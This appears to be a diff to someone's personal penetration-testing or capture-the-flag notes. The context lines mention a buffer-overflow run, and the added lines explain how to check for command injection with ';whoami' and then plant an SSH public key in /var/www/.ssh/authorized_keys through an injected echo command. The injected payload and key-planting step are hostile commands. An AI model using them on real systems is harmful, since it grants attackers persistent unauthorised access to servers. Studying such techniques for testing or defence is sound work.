@@ -184,3 +184,10 @@ get their eip and put it into it(info proc map)
 
 sudo ./func <<< $(python2 /tmp/linbuff.py)   #if you have root access then you don't need sudo in it
 robots.txt
+
+if you can command inject or get a webshell you can do this
+ping means you can most likely command inject(;whoami)
+ssh keygen -t rsa
+copy the public one 
+;echo "<put public rsa here" > /var/www/.ssh/authorized_keys    #/var/www is the home directory we are looking for
+might have to make the /.ssh directory in the guys home directory
